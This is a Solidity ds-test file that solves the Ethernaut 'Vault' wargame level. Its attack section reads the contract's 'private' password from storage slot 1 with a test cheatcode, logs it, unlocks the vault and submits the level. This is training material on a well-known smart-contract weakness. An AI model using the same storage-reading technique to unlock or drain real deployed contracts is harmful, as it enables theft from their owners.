pragma solidity ^0.8.10;

import "ds-test/test.sol";
import "../Vault/VaultFactory.sol";
import "../Ethernaut.sol";
import "./utils/vm.sol";

contract VaultTest is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;
    address eoaAddress = address(100);

    function setUp() public {
        // Setup instance of the Ethernaut contract
        ethernaut = new Ethernaut();
    }

    function testVaultHack() public {
        // <======= Change the test name
        // ========================= LEVEL SETUP
        // fund the EOA
        vm.deal(eoaAddress, 5 ether);

        // create the factory
        VaultFactory vaultFactory = new VaultFactory(); // <=== Uncomment and replace

        // register the level
        ethernaut.registerLevel(vaultFactory);

        // start pranking the user
        vm.startPrank(eoaAddress);

        // instantiate the level
        address levelAddress = ethernaut.createLevelInstance(vaultFactory);
        Vault ethernaughtVault = Vault(payable(levelAddress));

        // =========================  ATTACK
        // read the storage slot
        bytes32 password = vm.load(
            address(ethernaughtVault),
            bytes32(uint256(1))
        );

        emit log_named_string("Password", _bytes32ToString(password));
        ethernaughtVault.unlock(password);

        // ========================= SUBMISSION

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }

    function _bytes32ToString(bytes32 _bytes32) internal pure returns (string memory) {
        uint8 i = 0;
        while(i < 32 && _bytes32[i] != 0) {
            i++;
        }
        bytes memory bytesArray = new bytes(i);
        for (i = 0; i < 32 && _bytes32[i] != 0; i++) {
            bytesArray[i] = _bytes32[i];
        }
        return string(bytesArray);
    }
}
